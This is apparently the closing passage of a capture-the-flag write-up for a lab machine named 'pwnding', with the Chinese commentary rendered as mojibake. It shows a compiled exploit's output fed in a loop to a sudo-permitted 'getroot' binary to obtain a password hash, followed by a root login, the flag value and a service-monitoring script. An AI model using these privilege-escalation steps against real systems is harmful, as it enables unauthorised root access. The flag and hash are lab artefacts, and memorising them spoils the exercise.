(remote) lamb@pwnding:/tmp$ gcc exp.c -o exp -B /usr/bin -lm  
(remote) lamb@pwnding:/tmp$ ./exp
60136
(remote) lamb@pwnding:/tmp$ while true; do sudo /usr/local/bin/getroot $(./exp); sleep 1; done
$1$BvrTqWyB$Soa7qkeu1GfIoy2duf53t0
$1$BvrTqWyB$Soa7qkeu1GfIoy2duf53t0
$1$BvrTqWyB$Soa7qkeu1GfIoy2duf53t0
$1$BvrTqWyB$Soa7qkeu1GfIoy2duf53t0
^C
```

æ‹¿åˆ°å‡­è¯ï¼Œè¯´æ˜ä¿®æ”¹çš„ä»£ç å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼ŒåŸå§‹cä»£ç åè€Œå¯ä»¥åšåˆ°ï¼Œå°è¯•è¿›è¡Œç™»å½•ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849656.png" alt="image-20250610184751109" style="zoom:50%;" />

æˆåŠŸäº†ï¼Œè·å–flagå³å¯ï¼š

```bash
root@pwnding:~# cat ro0oo0ooo0oooo0oooo0ooo0oo0ot.txt
flag{46511d58f2ae11ef9ea3000c29094b2d}
root@pwnding:~# cat monitor.sh
#!/bin/bash

# é…ç½®æ—¥å¿—æ–‡ä»¶
LOG_FILE="/var/log/server_monitor.log"
MAX_LOG_SIZE=1048576 

# æ¸…ç†è¿‡å¤§çš„æ—¥å¿—æ–‡ä»¶
if [ -f "$LOG_FILE" ] && [ $(stat -c%s "$LOG_FILE") -gt $MAX_LOG_SIZE ]; then
    > "$LOG_FILE"
fi

log() {
    echo "[$(date '+%Y-%m-%d %T')] $1" | tee -a "$LOG_FILE"
}

# æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ—§å®ä¾‹
if [ -f "/tmp/server_monitor.lock" ]; then
    log "æ£€æµ‹åˆ°å·²æœ‰ç›‘æ§è¿›ç¨‹åœ¨è¿è¡Œï¼Œé€€å‡ºä¸­..."
    exit 1
fi

# åˆ›å»ºé”æ–‡ä»¶
trap 'rm -f /tmp/server_monitor.lock; exit 0' INT TERM EXIT
echo $$ > /tmp/server_monitor.lock

# ä¸»ç›‘æ§å¾ªç¯
while true; do
    if ! pgrep -x "server" > /dev/null; then
        log "æ£€æµ‹åˆ°æœåŠ¡æœªè¿è¡Œï¼Œå°è¯•å¯åŠ¨..."
        
        # åˆ‡æ¢ç”¨æˆ·å¹¶å¯åŠ¨æœåŠ¡
        if sudo -u lamb -i /opt/server 2>> "$LOG_FILE"; then
            log "æœåŠ¡å¯åŠ¨æˆåŠŸ"
        else
            log "æœåŠ¡å¯åŠ¨å¤±è´¥ï¼é”™è¯¯ç ï¼š$?"
            # æ·»åŠ å¤±è´¥é‡å¯é™åˆ¶
            sleep 1
        fi
    fi
    sleep 1
done
```

